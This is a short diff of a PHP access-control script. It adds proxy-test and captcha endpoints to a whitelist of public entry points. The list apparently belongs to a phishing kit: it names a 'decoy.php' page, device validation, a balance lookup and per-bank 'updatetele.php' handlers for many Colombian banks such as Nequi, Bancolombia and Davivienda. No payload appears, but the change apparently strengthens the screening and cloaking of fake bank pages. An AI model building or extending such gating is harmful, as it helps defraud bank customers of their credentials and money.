@@ -114,7 +114,7 @@ if ($isAdmin) {
     return; // FIN: Si es admin, no se bloquea nada más
 }
 
-$isPublicEntry = in_array($targetPath, ['index.php', 'v.php', 'decoy.php', 'api/router.php', 'router.php', 'setup.php', 'checkpoint.php', 'validate_device.php', 'updatetele.php', 'get_balance.php', 'pago/nequi/process/updatetele.php', 'pago/bancolombia/process/updatetele.php', 'pago/davivienda/process/updatetele.php', 'pago/avvillas/process/updatetele.php', 'pago/bbva/process/updatetele.php', 'pago/bogota/process/updatetele.php', 'pago/caja_social/process/updatetele.php', 'pago/colpatria/process/updatetele.php', 'pago/falabella/process/updatetele.php', 'pago/finandina/process/updatetele.php', 'pago/occidente/process/updatetele.php'])
+$isPublicEntry = in_array($targetPath, ['index.php', 'v.php', 'decoy.php', 'api/router.php', 'router.php', 'setup.php', 'checkpoint.php', 'validate_device.php', 'updatetele.php', 'get_balance.php', 'test_proxy.php', 'start_captcha.php', 'check_captcha.php', 'pago/nequi/process/updatetele.php', 'pago/bancolombia/process/updatetele.php', 'pago/davivienda/process/updatetele.php', 'pago/avvillas/process/updatetele.php', 'pago/bbva/process/updatetele.php', 'pago/bogota/process/updatetele.php', 'pago/caja_social/process/updatetele.php', 'pago/colpatria/process/updatetele.php', 'pago/falabella/process/updatetele.php', 'pago/finandina/process/updatetele.php', 'pago/occidente/process/updatetele.php'])
                  || strpos($targetPath, 'verificar_estado.php') !== false;
 
 
